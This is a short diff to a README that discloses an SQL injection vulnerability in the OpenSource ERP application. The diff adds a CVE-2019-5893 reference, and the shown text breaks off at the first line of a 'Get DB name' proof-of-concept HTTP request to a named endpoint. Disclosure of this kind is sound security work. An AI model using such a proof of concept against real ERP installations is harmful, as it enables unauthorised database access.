@@ -1,6 +1,9 @@
 # OpenSource-ERP-SQL-Injection
 [OpenSource ERP](http://www.nelson-it.ch/) application has SQL Injection vulnerability.
 
+## CVE-2019-5893
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5893
+
 # PoC - Get DB name
 ```
 POST /db/utils/query/data.xml HTTP/1.1
